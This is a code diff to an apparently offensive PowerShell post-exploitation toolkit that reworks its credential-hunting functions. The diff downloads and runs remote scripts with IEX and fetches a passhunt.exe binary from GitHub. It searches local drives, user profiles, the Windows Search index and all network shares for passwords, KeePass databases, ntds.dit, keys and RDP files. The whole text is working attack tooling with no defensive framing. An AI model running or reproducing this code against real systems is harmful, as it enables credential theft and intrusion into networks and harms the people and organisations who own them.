@@ -1034,8 +1034,8 @@ function localreconmodules
             
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/find-interesting.ps1')
                 Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
-                try{Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
-                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
+                try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
+                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup >> "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
                 Write-Verbose "Enumerating more interesting files..."
     
                 $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
@@ -1043,30 +1043,7 @@ function localreconmodules
       
                 $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
                 GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
-                function Get-IndexedFiles {
-                param (
-                [Parameter(Mandatory=$true)][string]$Pattern)  
-    
-                if($Path -eq ""){$Path = $PWD;} 
-        
-                $pattern = $pattern -replace "\*", "%"  
-                $path = $path + "\%"
-    
-                 $con = New-Object -ComObject ADODB.Connection
-                $rs = New-Object -ComObject ADODB.Recordset
-    
-                Try {
-                    $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
-                Catch {
-                    "[-] Indexed file search provider not available";Break
-                }
-                $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
-    
-                While(-Not $rs.EOF){
-                $rs.Fields.Item("System.ItemPathDisplay").Value
-                 $rs.MoveNext()
-                }
-            }
+
             }
             
             function browserpwn{
@@ -1155,6 +1132,37 @@ __        ___       ____
        }
     }
  While ($masterquestion -ne 9)
+}
+
+function Get-IndexedFiles 
+{
+     param (
+     [Parameter(Mandatory=$true)][string]$Pattern)  
+     
+     $drives = (Get-PSDrive -PSProvider FileSystem).Root
+     foreach ($drive in $drives)
+     {
+     Write-Host -ForegroundColor Yellow "Searching for files in drive $drive" 
+     $Path = $drive 
+        
+     $pattern = $pattern -replace "\*", "%"  
+     $path = $path + "\%"
+    
+     $con = New-Object -ComObject ADODB.Connection
+     $rs = New-Object -ComObject ADODB.Recordset
+    
+     Try {
+     $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
+     Catch {
+     "[-] Indexed file search provider not available";Break
+     }
+     $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
+    
+     While(-Not $rs.EOF){
+     $rs.Fields.Item("System.ItemPathDisplay").Value
+     $rs.MoveNext()
+     }
+     }
 }
 
 function SYSTEMShell
@@ -1306,40 +1314,30 @@ function passhunt
             $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
 
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
-            if (test-path $currentPath\passhunt.exe)
-            {
-                foreach ($line in $testShares)
-                {
-                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
-g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
-                }
-            }
-            else
-            {
+	    if (!(test-path $currentPath\passhunt.exe))
+	    {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                foreach ($line in $shares)
+            }
+	    foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
  -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
-                                    
-            }
-        }
+       }
         if ($local)
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            if (!(test-path $currentPath\passhunt.exe)){Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe}
             
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
             $sharepasshunt = "yes"
             if (!$noninteractive){$sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'}
             if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
             {
-                get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                $shares = get-content .\passhuntshares.txt | select-object -skip 4    
+                $shares = (Get-PSDrive -PSProvider FileSystem).Root
+                    
                 foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
